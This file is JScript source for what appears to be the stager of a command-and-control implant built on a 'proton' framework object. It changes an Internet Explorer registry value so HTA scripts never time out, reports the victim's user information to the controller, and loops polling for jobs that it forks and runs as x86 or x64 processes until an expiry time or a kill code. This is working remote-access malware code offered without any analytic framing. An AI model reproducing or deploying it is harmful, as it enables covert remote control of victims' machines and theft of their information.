try
{
    if (proton.JOBKEY != "stage")
    {
        if (proton.isHTA())
        {
            //HKCU\SOFTWARE\Microsoft\Internet Explorer\Style\MaxScriptStatements = 0xFFFFFFFF
            var path = "SOFTWARE\\Microsoft\\Internet Explorer\\Styles";
            var key = "MaxScriptStatements";
            proton.registry.write(proton.registry.HKCU, path, key, 0xFFFFFFFF, proton.registry.DWORD);
        }

        proton.work.report(proton.user.info());

        try {
          proton.work.fork("");
        } catch (e) {
          proton.work.error(e)
        }
        proton.exit();
    }
    else
    {
        if (proton.isHTA())
            DoWorkTimeout();
        else
            DoWorkLoop();
    }
}
catch (e)
{
    // todo: critical error reporting
    proton.work.error(e);
}

function DoWork()
{

    var epoch = new Date().getTime();
    var expire = parseInt(proton.EXPIRE);
    if (epoch > expire)
    {
        return false;
    }

    try
    {
        var work = proton.work.get();
        // 201 = x64 or x86
        // 202 = force x86
        if (work.status == 201 || work.status == 202)
        {
            if (work.responseText.length > 0) {
                var jobkey = work.responseText;
                proton.work.fork(jobkey, work.status == 202);
            }
        }
        else // if (work.status == 500) // kill code
        {
            return false;
        }
    }
    catch (e)
    {
        return false;
    }

    return true;
}

function DoWorkLoop()
{
    while (DoWork())
        ;

    proton.exit();
}

function DoWorkTimeout()
{
    for (var i = 0; i < 10; ++i)
    {
      if (!DoWork())
      {
          proton.exit();
          return;
      }
    }
    //window.setTimeout(DoWorkTimeoutCallback, 0);

    proton.work.fork("");
    proton.exit();
}
